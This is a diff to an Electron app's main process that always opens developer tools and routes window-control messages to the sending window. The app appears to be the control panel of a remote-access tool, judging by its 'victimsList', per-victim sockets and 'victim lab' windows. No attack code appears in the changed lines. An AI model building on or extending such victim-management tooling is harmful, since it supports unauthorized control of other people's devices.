@@ -193,7 +193,7 @@ function createWindow() {
   win.loadFile(__dirname + '/app/index.html');
   
   // Uncomment to open dev tools for debugging
-  // win.webContents.openDevTools()
+  win.webContents.openDevTools()
 
   win.on('closed', () => {
     log.info('Main window closed');
@@ -465,21 +465,35 @@ process.on('uncaughtException', function (error) {
 });
 
 // Handle window control IPC messages as fallback for when remote module doesn't work
+// These handlers work for both main window and lab windows by using event.sender
 ipcMain.on('window-close', (event) => {
   log.info('Window close requested');
-  if (win) {
+  const targetWindow = BrowserWindow.fromWebContents(event.sender);
+  if (targetWindow && !targetWindow.isDestroyed()) {
+    targetWindow.close();
+  } else if (win) {
     win.close();
   }
 });
 
 ipcMain.on('window-minimize', (event) => {
-  if (win) {
+  const targetWindow = BrowserWindow.fromWebContents(event.sender);
+  if (targetWindow && !targetWindow.isDestroyed()) {
+    targetWindow.minimize();
+  } else if (win) {
     win.minimize();
   }
 });
 
 ipcMain.on('window-maximize', (event) => {
-  if (win) {
+  const targetWindow = BrowserWindow.fromWebContents(event.sender);
+  if (targetWindow && !targetWindow.isDestroyed()) {
+    if (targetWindow.isMaximized()) {
+      targetWindow.unmaximize();
+    } else {
+      targetWindow.maximize();
+    }
+  } else if (win) {
     if (win.isMaximized()) {
       win.unmaximize();
     } else {
@@ -517,7 +531,7 @@ ipcMain.on('openLabWindow', function (e, page, index) {
   windows[index] = child.id;
   
   // Uncomment to debug lab window
-  // child.webContents.openDevTools();
+  child.webContents.openDevTools();
 
   // pass the victim info to this victim lab with logging wrapper
   const originalSocket = victimsList.getVictim(index).socket;
